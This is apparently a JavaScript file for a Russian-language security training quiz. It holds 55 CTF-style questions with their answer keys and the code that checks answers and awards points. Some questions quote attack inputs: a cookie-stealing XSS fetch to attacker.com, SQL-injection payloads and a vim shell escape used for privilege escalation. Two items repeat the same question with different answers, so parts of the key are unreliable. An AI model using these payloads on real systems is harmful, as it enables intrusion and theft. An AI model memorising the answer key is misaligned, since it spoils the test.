// labs-test.js — тест LESSIONS+LABs по лабораторным работам

const labTasks = [
    { id: 1,  code: "linux_uid_root", points: 1,
      text: "Какой UID имеет пользователь root в Linux? Формат: CTF{число}",
      answer: "CTF{0}" },
    { id: 2,  code: "linux_file_rights_rw_r_r", points: 1,
      text: "Права файла -rw-r--r--. Кому разрешена запись? Формат: CTF{owner}",
      answer: "CTF{owner}" },
    { id: 3,  code: "auth_log_location", points: 1,
      text: "В каком файле в Linux хранятся записи о попытках авторизации? Формат: CTF{/путь}",
      answer: "CTF{/var/log/auth.log}" },
    { id: 4,  code: "nmap_port_22_protocol", points: 1,
      text: "Какой протокол обычно используется портом 22? Формат: CTF{протокол}",
      answer: "CTF{ssh}" },
    { id: 5,  code: "hash_algo_id", points: 1,
      text: "Строка $6$... в /etc/shadow — какой алгоритм хэширования? Формат: CTF{...}",
      answer: "CTF{sha512}" },
    { id: 6,  code: "arp_table_contains", points: 1,
      text: "Что хранится в ARP-таблице? Формат: CTF{...}",
      answer: "CTF{ip_to_mac}" },
    { id: 7,  code: "dns_spoof_definition", points: 1,
      text: "Что делает злоумышленник при DNS-spoof атаке? Кратко. Формат: CTF{...}",
      answer: "CTF{подмена_dns}" },
    { id: 8,  code: "http_vs_https_main_problem", points: 1,
      text: "Какое свойство есть у HTTPS, но нет у HTTP? Формат: CTF{...}",
      answer: "CTF{шифрование}" },
    { id: 9,  code: "xss_definition_basic", points: 1,
      text: "Что такое XSS? Одно слово. Формат: CTF{...}",
      answer: "CTF{script_injection}" },
    { id: 10, code: "sql_union_explain", points: 1,
      text: "Для чего используется UNION SELECT в SQL-инъекциях? Формат: CTF{...}",
      answer: "CTF{получение_данных}" },
    { id: 11, code: "openssl_what_is_ca", points: 1,
      text: "Кто выдает сертификаты TLS? Формат: CTF{...}",
      answer: "CTF{certificate_authority}" },
    { id: 12, code: "mitm_attack_first_step", points: 1,
      text: "Первый шаг MITM-атаки в локальной сети (ARP spoofing). Формат: CTF{...}",
      answer: "CTF{arp_spoofing}" },
    { id: 13, code: "shadow_file_location", points: 1,
      text: "Где хранятся хэши паролей пользователей Linux? Формат: CTF{/...}",
      answer: "CTF{/etc/shadow}" },
    { id: 14, code: "nmap_filtered_meaning", points: 1,
      text: "Что означает статус порта filtered в nmap? Формат: CTF{firewall_blocks}",
      answer: "CTF{firewall_blocks}" },
    { id: 15, code: "http_cookie_missing_attr", points: 1,
      text: "Какой флаг cookie не дает JS прочитать её? Формат: CTF{...}",
      answer: "CTF{httponly}" },
    { id: 16, code: "ssh_default_port", points: 1,
      text: "Какой порт по умолчанию использует SSH? Формат: CTF{...}",
      answer: "CTF{22}" },
    { id: 17, code: "tls_hsts_meaning", points: 1,
      text: "Что делает технология HSTS? Формат: CTF{запрещает_http}",
      answer: "CTF{запрещает_http}" },
    { id: 18, code: "bruteforce_definition", points: 1,
      text: "Что такое brute-force атака? Формат: CTF{...}",
      answer: "CTF{полный_перебор}" },
    { id: 19, code: "dvwa_security_levels", points: 1,
      text: "Минимальный уровень защиты DVWA. Формат: CTF{...}",
      answer: "CTF{low}" },
    { id: 20, code: "arp_protocol_type", points: 1,
      text: "ARP работает поверх какого протокола? Формат: CTF{...}",
      answer: "CTF{ethernet}" },
    { id: 21, code: "linux_find_attacker_in_logs", points: 5,
      text: "Фрагмент /var/log/auth.log. Определите IP, откуда идёт брутфорс. Формат: CTF{IP}",
      answer: "CTF{192.168.1.55}" },
    { id: 22, code: "linux_permission_analysis", points: 4,
      text: "Может ли пользователь hacker изменить файл secret.txt при данных правах? Формат: CTF{yes} или CTF{no}",
      answer: "CTF{no}" },
    { id: 23, code: "nmap_compare_scans", points: 4,
      text: "До/после hardening. Какой сервис был отключён? Формат: CTF{service}",
      answer: "CTF{ftp}" },
    { id: 24, code: "nmap_detect_os", points: 4,
      text: "Вывод OS detection nmap. Предполагаемая ОС. Формат: CTF{os}",
      answer: "CTF{linux}" },
    { id: 25, code: "password_hash_identification", points: 4,
      text: "Хэш admin:$6$... Какой алгоритм? Формат: CTF{algo}",
      answer: "CTF{sha512}" },
    { id: 26, code: "hash_complexity_compare", points: 5,
      text: "Пароли A/B/C. Какой взломается быстрее? Формат: CTF{A/B/C}",
      answer: "CTF{C}" },
    { id: 27, code: "arp_who_is_attacker", points: 5,
      text: "По ARP-ответам определите MAC злоумышленника. Формат: CTF{mac}",
      answer: "CTF{aa:bb:cc:dd:ee:99}" },
    { id: 28, code: "dns_spoofed_packet", points: 5,
      text: "DNS-ответы example.com → ... Какой пакет поддельный? Формат: CTF{1} или CTF{2}",
      answer: "CTF{2}" },
    { id: 29, code: "http_credentials_extraction", points: 5,
      text: "HTTP POST /login ... Укажите логин. Формат: CTF{login}",
      answer: "CTF{alex}" },
    { id: 30, code: "xss_payload_effect", points: 4,
      text: "Что делает XSS payload fetch(\"http://attacker.com/?c=\"+document.cookie)? Формат: CTF{описание}",
      answer: "CTF{крадет_cookie}" },
    { id: 31, code: "sqli_type_detection", points: 5,
      text: "Пэйлоад ?id=1' OR '1'='1'--. Тип SQL-инъекции? Формат: CTF{тип}",
      answer: "CTF{boolean_based}" },
    { id: 32, code: "sqli_version_extract", points: 4,
      text: "1' UNION SELECT version(), user()--. Что пытается получить пэйлоад? Формат: CTF{...}",
      answer: "CTF{version}" },
    { id: 33, code: "dvwa_security_level_effect", points: 4,
      text: "Какое ключевое изменение вводит уровень Medium в DVWA SQLi? Формат: CTF{...}",
      answer: "CTF{prepared_statements}" },
    { id: 34, code: "ssl_cert_inspection", points: 5,
      text: "Subject: CN=example.com, O=Example Ltd. Укажите CN. Формат: CTF{cn}",
      answer: "CTF{example.com}" },
    { id: 35, code: "ssl_chain_error", points: 5,
      text: "RootCA → IntermediateCA (expired) → server_cert. Какой сертификат вызывает ошибку? Формат: CTF{name}",
      answer: "CTF{IntermediateCA}" },
    { id: 36, code: "ocsp_status_check", points: 4,
      text: "OCSP: successful, Cert Status: revoked. Каков статус сертификата? Формат: CTF{good/revoked}",
      answer: "CTF{revoked}" },
    { id: 37, code: "crl_distribution_point", points: 4,
      text: "CRL Distribution Points: URI:http://ca.example.com/root.crl. Введите адрес CRL. Формат: CTF{url}",
      answer: "CTF{http://ca.example.com/root.crl}" },
    { id: 38, code: "mitm_identify_stage", points: 4,
      text: "Who-has 192.168.1.1? Tell 192.168.1.5 ... Какой этап MITM? Формат: CTF{arp/dns/http}",
      answer: "CTF{arp}" },
    { id: 39, code: "linux_group_membership", points: 4,
      text: "lab1:x:1002:anna,petya,mark. Кто в группе lab1 (в порядке)? Формат: CTF{anna,petya,mark}",
      answer: "CTF{anna,petya,mark}" },
    { id: 40, code: "shadow_hash_crack_estimate", points: 5,
      text: "Пароли A/B/C. Какой взломается быстрее? Формат: CTF{A/B/C}",
      answer: "CTF{B}" },
    { id: 41, code: "linux_attack_reconstruction", points: 10,
      text: "По истории команд определите, какой файл подменяли. Формат: CTF{/path/to/file}",
      answer: "CTF{/etc/shadow}" },
    { id: 42, code: "nmap_firewall_behavior", points: 10,
      text: "Вывод nmap c open/filtered/filtered. Какой порт явно фильтруется FW? Формат: CTF{port}",
      answer: "CTF{3306}" },
    { id: 43, code: "hash_attack_mask_logic", points: 10,
      text: "Маска ?u?l?l?l?d?s?d. Пример подходящего пароля. Формат: CTF{пример}",
      answer: "CTF{Qabc5!7}" },
    { id: 44, code: "arp_dns_http_chain", points: 12,
      text: "Цепочка MITM: ARP → DNS → HTTP. Какой этап отражает второе сообщение? Формат: CTF{этап}",
      answer: "CTF{dns_spoof}" },
    { id: 45, code: "sqli_error_identification", points: 10,
      text: "SQL syntax error near '' OR 1=1 ... Причина? Формат: CTF{причина}",
      answer: "CTF{незакрытая_кавычка}" },
    { id: 46, code: "ssl_chain_reconstruction", points: 12,
      text: "Цепочка server_cert → IntermediateCA2 → RootCA, ошибка intermediate. Какого сертификата не хватает? Формат: CTF{name}",
      answer: "CTF{IntermediateCA1}" },
    { id: 47, code: "ocsp_vs_crl_diagnose", points: 12,
      text: "OCSP: good, CRL: содержит serial revoked. Фактический статус? Формат: CTF{статус}",
      answer: "CTF{revoked}" },
    { id: 48, code: "dns_cache_poison_trace", points: 12,
      text: "DNS: intranet.company.local → 172.16.0.10 ... затем 8.8.8.8. Какой адрес подменён? Формат: CTF{ip}",
      answer: "CTF{8.8.8.8}" },
    { id: 49, code: "unauthorized_priv_escalation_trace", points: 15,
      text: "sudo-логи: запуск /usr/bin/vim как root, :!sh ... Какой инструмент использован? Формат: CTF{tool}",
      answer: "CTF{vim}" },
    { id: 50, code: "tls_attack_hardening_fail", points: 15,
      text: "TLS-конфиг: слабый шифр + no forward secrecy. Что сильнее всего снижает безопасность? Формат: CTF{problem}",
      answer: "CTF{no_forward_secrecy}" },
    { id: 51, code: "full_mitm_attack_reconstruction", points: 25,
      text: "MITM: ARP, DNS, HTTP POST flag=... base64(...). Расшифруйте флаг. Формат: CTF{...}",
      answer: "CTF{super_hidden_flag}" },
    { id: 52, code: "dvwa_multistep_exploit", points: 30,
      text: "DVWA: cookie user/role/flag в base64. Расшифруйте значение flag. Формат: CTF{...}",
      answer: "CTF{xmas_completed}" },
    { id: 53, code: "tls_chain_attack_full", points: 35,
      text: "Цепочка с IntermediateCA2 (expired), в комментарии сертификата спрятан флаг. Укажите его. Формат: CTF{...}",
      answer: "CTF{tls_chain_master}" },
    { id: 54, code: "advanced_forensics_shadow_recovery", points: 30,
      text: "Фрагмент /etc/shadow c SHA-512. Какой пароль из списка подходит? Формат: CTF{пароль}",
      answer: "CTF{Alpine2024}" },
    { id: 55, code: "full_attack_scenario", points: 40,
      text: "MITM + SQLi + hash + base64. Итоговый флаг после расшифровки. Формат: CTF{...}",
      answer: "CTF{full_attack_success}" }
];

let labsSolved = 0;
let labsPointsGranted = false;

document.addEventListener("DOMContentLoaded", () => {
    renderLabTasks();
    updateLabsProgress();

    const backBtn = document.getElementById("labsBackToTasksBtn");
    if (backBtn) {
        backBtn.addEventListener("click", () => {
            document.getElementById("labsResultsSection").style.display = "none";
            document.getElementById("labTasksContainer").style.display = "block";
        });
    }

    const finishBtn = document.getElementById("labsFinishBtn");
    if (finishBtn) {
        finishBtn.addEventListener("click", () => {
            showLabsResults();
        });
    }
});

function renderLabTasks() {
    const container = document.getElementById("labTasksContainer");
    if (!container) return;

    container.innerHTML = "";
    labsSolved = 0;

    labTasks.forEach(task => {
        const card = document.createElement("div");
        card.className = "question-card";

        card.innerHTML = `
            <div class="question-header">
                <span class="question-number">Задание ${task.id}</span>
                <span class="question-points">+${task.points} балл(ов)</span>
            </div>
            <div class="question-text">
                <strong>${task.code}</strong><br/>
                ${task.text}
            </div>
            <div class="options-container" style="flex-direction: column; align-items: stretch;">
                <input type="text"
                       class="answer-input"
                       id="lab-answer-${task.id}"
                       placeholder="Введите флаг, например: CTF{...}">
                <button class="submit-btn" id="lab-check-${task.id}">
                    Проверить
                </button>
            </div>
            <div class="results-section" style="display:block; margin-top:10px; padding:10px 12px;" id="lab-feedback-${task.id}">
                <span style="color:#888;">Флаг пока не проверен.</span>
            </div>
        `;

        container.appendChild(card);

        const btn = document.getElementById(`lab-check-${task.id}`);
        const input = document.getElementById(`lab-answer-${task.id}`);

        const handler = () => checkLabAnswer(task, input, document.getElementById(`lab-feedback-${task.id}`));
        if (btn) btn.addEventListener("click", handler);
        if (input) {
            input.addEventListener("keypress", (e) => {
                if (e.key === "Enter") handler();
            });
        }
    });

    document.getElementById("labsTotal").textContent = labTasks.length.toString();
}

function normalizeFlag(value) {
    return value.trim();
}

function checkLabAnswer(task, inputEl, feedbackEl) {
    if (!inputEl || !feedbackEl) return;

    const userValue = normalizeFlag(inputEl.value);
    const correct = task.answer;

    if (!userValue) {
        feedbackEl.innerHTML = `<span style="color:#ffcc00;">Введите флаг в формате ${correct.replace(/[A-Za-z0-9_]+/, "...")}.</span>`;
        return;
    }

    // точное сравнение, без изменения регистра
    if (userValue === correct) {
        if (!feedbackEl.dataset.correct) {
            feedbackEl.dataset.correct = "true";
            labsSolved++;
            updateLabsProgress();
        }
        feedbackEl.innerHTML = `<span style="color:#00ff88;">Верно! (${correct})</span>`;
    } else {
        feedbackEl.dataset.correct = "";
        feedbackEl.innerHTML = `<span style="color:#ff4d4f;">Неверно. Попробуйте ещё раз.</span>`;
    }

    if (labsSolved === labTasks.length) {
        showLabsResults();
    }
}

function updateLabsProgress() {
    const solvedEl = document.getElementById("labsSolved");
    const totalEl = document.getElementById("labsTotal");
    const fill = document.getElementById("labsProgressFill");

    if (solvedEl) solvedEl.textContent = labsSolved.toString();
    if (totalEl) totalEl.textContent = labTasks.length.toString();
    if (fill) {
        const percent = (labsSolved / labTasks.length) * 100;
        fill.style.width = `${percent}%`;
    }
}

function showLabsResults() {
    const results = document.getElementById("labsResultsSection");
    const container = document.getElementById("labTasksContainer");

    if (container) container.style.display = "none";
    if (results) {
        results.style.display = "block";
        // Пересчитываем реальные решённые задания и суммарные очки
        let solved = 0;
        let totalPoints = 0;

        labTasks.forEach(task => {
            const input = document.getElementById(`lab-answer-${task.id}`);
            if (!input) return;
            const val = normalizeFlag(input.value);
            if (val === task.answer) {
                solved++;
                totalPoints += task.points;
            }
        });

        const solvedEl = document.getElementById("labsFinalSolved");
        const totalEl = document.getElementById("labsFinalTotal");
        if (solvedEl) solvedEl.textContent = solved.toString();
        if (totalEl) totalEl.textContent = labTasks.length.toString();

        // Начисляем очки один раз за сессию
        awardLabsPoints(totalPoints);
    }
}

// Начисление обычных очков через backend (в points)
async function awardLabsPoints(totalPoints) {
    if (labsPointsGranted) return;
    if (!totalPoints || totalPoints <= 0) return;

    try {
        const response = await fetch(`/points/add?amount=${totalPoints}`, {
            method: "POST",
            credentials: "include"
        });

        if (response.ok) {
            labsPointsGranted = true;
            console.log(`Lab points awarded: ${totalPoints}`);
        } else {
            console.warn("Не удалось начислить лаб-очки:", await response.text());
        }
    } catch (e) {
        console.error("Ошибка при начислении лаб-очков:", e);
    }
}

